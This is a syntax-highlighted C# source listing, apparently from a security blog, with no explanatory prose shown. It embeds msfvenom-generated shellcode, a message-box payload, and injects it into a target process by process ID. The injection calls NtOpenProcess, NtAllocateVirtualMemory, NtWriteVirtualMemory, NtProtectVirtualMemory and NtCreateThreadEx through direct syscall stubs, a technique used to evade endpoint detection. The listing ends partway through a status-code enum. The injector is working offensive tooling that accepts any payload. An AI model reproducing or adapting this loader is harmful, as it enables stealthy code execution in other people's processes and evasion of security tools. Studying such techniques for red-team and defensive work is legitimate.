<span style="color:#66d9ef">namespace</span> ConsoleApp1
{
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
    {
        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] <span style="color:#ae81ff">_</span>shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
            <span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x02</span>,
            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x88</span>,
            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x24</span>,
            <span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,
            <span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,
            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,
            <span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xc1</span>,
            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x8d</span>,
            <span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xff</span>,
            <span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,
            <span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x13</span>,
            <span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,
            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x73</span>,
            <span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x00</span> };

    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
    {
        <span style="color:#75715e">// NtOpenProcess
</span><span style="color:#75715e"></span>        IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
        NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));

        IntPtr hProcess = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();

        CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
        {
            UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
        };

        NTSTATUS result = ntOpenProcess(
            <span style="color:#66d9ef">ref</span> hProcess,
            <span style="color:#ae81ff">0x001F0FFF</span>,
            <span style="color:#66d9ef">ref</span> oa,
            <span style="color:#66d9ef">ref</span> ci);

        <span style="color:#75715e">// NtAllocateVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtAllocateVirtualMemory));

        IntPtr baseAddress = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)<span style="color:#ae81ff">_</span>shellcode.Length;

        result = ntAllocateVirtualMemory(
            hProcess,
            <span style="color:#66d9ef">ref</span> baseAddress,
            IntPtr.Zero,
            <span style="color:#66d9ef">ref</span> regionSize,
            <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>,
            <span style="color:#ae81ff">0x04</span>);

        <span style="color:#75715e">// NtWriteVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtWriteVirtualMemory&#34;</span>);
        NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtWriteVirtualMemory));

        <span style="color:#66d9ef">var</span> buffer = Marshal.AllocHGlobal(<span style="color:#ae81ff">_</span>shellcode.Length);
        Marshal.Copy(<span style="color:#ae81ff">_</span>shellcode, <span style="color:#ae81ff">0</span>, buffer, <span style="color:#ae81ff">_</span>shellcode.Length);

        <span style="color:#66d9ef">uint</span> bytesWritten = <span style="color:#ae81ff">0</span>;

        result = ntWriteVirtualMemory(
            hProcess,
            baseAddress,
            buffer,
            (<span style="color:#66d9ef">uint</span>)<span style="color:#ae81ff">_</span>shellcode.Length,
            <span style="color:#66d9ef">ref</span> bytesWritten);

        <span style="color:#75715e">// NtProtectVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtProtectVirtualMemory&#34;</span>);
        NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtProtectVirtualMemory));

        <span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;

        result = ntProtectVirtualMemory(
            hProcess,
            <span style="color:#66d9ef">ref</span> baseAddress,
            <span style="color:#66d9ef">ref</span> regionSize,
            <span style="color:#ae81ff">0x20</span>,
            <span style="color:#66d9ef">ref</span> oldProtect);

        <span style="color:#75715e">// NtCreateThreadEx
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtCreateThreadEx&#34;</span>);
        NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtCreateThreadEx));

        IntPtr hThread = IntPtr.Zero;

        result = ntCreateThreadEx(
            <span style="color:#66d9ef">out</span> hThread,
            ACCESS_MASK.MAXIMUM_ALLOWED,
            IntPtr.Zero,
            hProcess,
            baseAddress,
            IntPtr.Zero,
            <span style="color:#66d9ef">false</span>,
            <span style="color:#ae81ff">0</span>,
            <span style="color:#ae81ff">0</span>,
            <span style="color:#ae81ff">0</span>,
            IntPtr.Zero);
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
            <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
            <span style="color:#66d9ef">uint</span> DesiredAccess,
            <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
            <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
            IntPtr ZeroBits,
            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
            <span style="color:#66d9ef">uint</span> AllocationType,
            <span style="color:#66d9ef">uint</span> Protect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            <span style="color:#66d9ef">uint</span> BufferLength,
            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> BytesWritten);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
            <span style="color:#66d9ef">uint</span> NewProtect,
            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> OldProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtCreateThreadEx(
            <span style="color:#66d9ef">out</span> IntPtr threadHandle,
            ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            <span style="color:#66d9ef">bool</span> createSuspended,
            <span style="color:#66d9ef">int</span> stackZeroBits,
            <span style="color:#66d9ef">int</span> sizeOfStack,
            <span style="color:#66d9ef">int</span> maximumStackSize,
            IntPtr attributeList);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
        {
            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
            <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
            <span style="color:#66d9ef">public</span> IntPtr ObjectName;
            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
            <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
            <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
        {
            <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
            <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [Flags]</span>
        <span style="color:#66d9ef">enum</span> ACCESS_MASK : <span style="color:#66d9ef">uint</span>
        {
            DELETE = <span style="color:#ae81ff">0x00010000</span>,
            READ_CONTROL = <span style="color:#ae81ff">0x00020000</span>,
            WRITE_DAC = <span style="color:#ae81ff">0x00040000</span>,
            WRITE_OWNER = <span style="color:#ae81ff">0x00080000</span>,
            SYNCHRONIZE = <span style="color:#ae81ff">0x00100000</span>,
            STANDARD_RIGHTS_REQUIRED = <span style="color:#ae81ff">0x000F0000</span>,
            STANDARD_RIGHTS_READ = <span style="color:#ae81ff">0x00020000</span>,
            STANDARD_RIGHTS_WRITE = <span style="color:#ae81ff">0x00020000</span>,
            STANDARD_RIGHTS_EXECUTE = <span style="color:#ae81ff">0x00020000</span>,
            STANDARD_RIGHTS_ALL = <span style="color:#ae81ff">0x001F0000</span>,
            SPECIFIC_RIGHTS_ALL = <span style="color:#ae81ff">0x0000FFF</span>,
            ACCESS_SYSTEM_SECURITY = <span style="color:#ae81ff">0x01000000</span>,
            MAXIMUM_ALLOWED = <span style="color:#ae81ff">0x02000000</span>,
            GENERIC_READ = <span style="color:#ae81ff">0x80000000</span>,
            GENERIC_WRITE = <span style="color:#ae81ff">0x40000000</span>,
            GENERIC_EXECUTE = <span style="color:#ae81ff">0x20000000</span>,
            GENERIC_ALL = <span style="color:#ae81ff">0x10000000</span>,
            DESKTOP_READOBJECTS = <span style="color:#ae81ff">0x00000001</span>,
            DESKTOP_CREATEWINDOW = <span style="color:#ae81ff">0x00000002</span>,
            DESKTOP_CREATEMENU = <span style="color:#ae81ff">0x00000004</span>,
            DESKTOP_HOOKCONTROL = <span style="color:#ae81ff">0x00000008</span>,
            DESKTOP_JOURNALRECORD = <span style="color:#ae81ff">0x00000010</span>,
            DESKTOP_JOURNALPLAYBACK = <span style="color:#ae81ff">0x00000020</span>,
            DESKTOP_ENUMERATE = <span style="color:#ae81ff">0x00000040</span>,
            DESKTOP_WRITEOBJECTS = <span style="color:#ae81ff">0x00000080</span>,
            DESKTOP_SWITCHDESKTOP = <span style="color:#ae81ff">0x00000100</span>,
            WINSTA_ENUMDESKTOPS = <span style="color:#ae81ff">0x00000001</span>,
            WINSTA_READATTRIBUTES = <span style="color:#ae81ff">0x00000002</span>,
            WINSTA_ACCESSCLIPBOARD = <span style="color:#ae81ff">0x00000004</span>,
            WINSTA_CREATEDESKTOP = <span style="color:#ae81ff">0x00000008</span>,
            WINSTA_WRITEATTRIBUTES = <span style="color:#ae81ff">0x00000010</span>,
            WINSTA_ACCESSGLOBALATOMS = <span style="color:#ae81ff">0x00000020</span>,
            WINSTA_EXITWINDOWS = <span style="color:#ae81ff">0x00000040</span>,
            WINSTA_ENUMERATE = <span style="color:#ae81ff">0x00000100</span>,
            WINSTA_READSCREEN = <span style="color:#ae81ff">0x00000200</span>,
            WINSTA_ALL_ACCESS = <span style="color:#ae81ff">0x0000037F</span>,

            SECTION_ALL_ACCESS = <span style="color:#ae81ff">0x10000000</span>,
            SECTION_QUERY = <span style="color:#ae81ff">0x0001</span>,
            SECTION_MAP_WRITE = <span style="color:#ae81ff">0x0002</span>,
            SECTION_MAP_READ = <span style="color:#ae81ff">0x0004</span>,
            SECTION_MAP_EXECUTE = <span style="color:#ae81ff">0x0008</span>,
            SECTION_EXTEND_SIZE = <span style="color:#ae81ff">0x0010</span>
        };
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [Flags]</span>
        <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
        {
            <span style="color:#75715e">// Success
</span><span style="color:#75715e"></span>            Success = <span style="color:#ae81ff">0x00000000</span>,
            Wait0 = <span style="color:#ae81ff">0x00000000</span>,
            Wait1 = <span style="color:#ae81ff">0x00000001</span>,
            Wait2 = <span style="color:#ae81ff">0x00000002</span>,
            Wait3 = <span style="color:#ae81ff">0x00000003</span>,
            Wait63 = <span style="color:#ae81ff">0x0000003f</span>,
            Abandoned = <span style="color:#ae81ff">0x00000080</span>,
            AbandonedWait0 = <span style="color:#ae81ff">0x00000080</span>,
            AbandonedWait1 = <span style="color:#ae81ff">0x00000081</span>,
            AbandonedWait2 = <span style="color:#ae81ff">0x00000082</span>,
            AbandonedWait3 = <span style="color:#ae81ff">0x00000083</span>,
            AbandonedWait63 = <span style="color:#ae81ff">0x000000bf</span>,
            UserApc = <span style="color:#ae81ff">0x000000c0</span>,
            KernelApc = <span style="color:#ae81ff">0x00000100</span>,
            Alerted = <span style="color:#ae81ff">0x00000101</span>,
            Timeout = <span style="color:#ae81ff">0x00000102</span>,
            Pending = <span style="color:#ae81ff">0x00000103</span>,
            Reparse = <span style="color:#ae81ff">0x00000104</span>,
            MoreEntries = <span style="color:#ae81ff">0x00000105</span>,
            NotAllAssigned = <span style="color:#ae81ff">0x00000106</span>,
            SomeNotMapped = <span style="color:#ae81ff">0x00000107</span>,
            OpLockBreakInProgress = <span style="color:#ae81ff">0x00000108</span>,
            VolumeMounted = <span style="color:#ae81ff">0x00000109</span>,
            RxActCommitted = <span style="color:#ae81ff">0x0000010a</span>,
            NotifyCleanup = <span style="color:#ae81ff">0x0000010b</span>,
            NotifyEnumDir = <span style="color:#ae81ff">0x0000010c</span>,
            NoQuotasForAccount = <span style="color:#ae81ff">0x0000010d</span>,
            PrimaryTransportConnectFailed = <span style="color:#ae81ff">0x0000010e</span>,
            PageFaultTransition = <span style="color:#ae81ff">0x00000110</span>,
            PageFaultDemandZero = <span style="color:#ae81ff">0x00000111</span>,
            PageFaultCopyOnWrite = <span style="color:#ae81ff">0x00000112</span>,
            PageFaultGuardPage = <span style="color:#ae81ff">0x00000113</span>,
            PageFaultPagingFile = <span style="color:#ae81ff">0x00000114</span>,
            CrashDump = <span style="color:#ae81ff">0x00000116</span>,
            ReparseObject = <span style="color:#ae81ff">0x00000118</span>,
            NothingToTerminate = <span style="color:#ae81ff">0x00000122</span>,
            ProcessNotInJob = <span style="color:#ae81ff">0x00000123</span>,
            ProcessInJob = <span style="color:#ae81ff">0x00000124</span>,
            ProcessCloned = <span style="color:#ae81ff">0x00000129</span>,
            FileLockedWithOnlyReaders = <span style="color:#ae81ff">0x0000012a</span>,
            FileLockedWithWriters = <span style="color:#ae81ff">0x0000012b</span>,

            <span style="color:#75715e">// Informational
</span><span style="color:#75715e"></span>            Informational = <span style="color:#ae81ff">0x40000000</span>,
            ObjectNameExists = <span style="color:#ae81ff">0x40000000</span>,
            ThreadWasSuspended = <span style="color:#ae81ff">0x40000001</span>,
            WorkingSetLimitRange = <span style="color:#ae81ff">0x40000002</span>,
            ImageNotAtBase = <span style="color:#ae81ff">0x40000003</span>,
            RegistryRecovered = <span style="color:#ae81ff">0x40000009</span>,

            <span style="color:#75715e">// Warning
</span><span style="color:#75715e"></span>            Warning = <span style="color:#ae81ff">0x80000000</span>,
            GuardPageViolation = <span style="color:#ae81ff">0x80000001</span>,
            DatatypeMisalignment = <span style="color:#ae81ff">0x80000002</span>,
            Breakpoint = <span style="color:#ae81ff">0x80000003</span>,
            SingleStep = <span style="color:#ae81ff">0x80000004</span>,
            BufferOverflow = <span style="color:#ae81ff">0x80000005</span>,
            NoMoreFiles = <span style="color:#ae81ff">0x80000006</span>,
            HandlesClosed = <span style="color:#ae81ff">0x8000000a</span>,
            PartialCopy = <span style="color:#ae81ff">0x8000000d</span>,
            DeviceBusy = <span style="color:#ae81ff">0x80000011</span>,
            InvalidEaName = <span style="color:#ae81ff">0x80000013</span>,
            EaListInconsistent = <span style="color:#ae81ff">0x80000014</span>,
            NoMoreEntries = <span style="color:#ae81ff">0x8000001a</span>,
            LongJump = <span style="color:#ae81ff">0x80000026</span>,
            DllMightBeInsecure = <span style="color:#ae81ff">0x8000002b</span>,

            <span style="color:#75715e">// Error
</span><span style="color:#75715e"></span>            Error = <span style="color:#ae81ff">0xc0000000</span>,
            Unsuccessful = <span style="color:#ae81ff">0xc0000001</span>,
            NotImplemented = <span style="color:#ae81ff">0xc0000002</span>,
            InvalidInfoClass = <span style="color:#ae81ff">0xc0000003</span>,
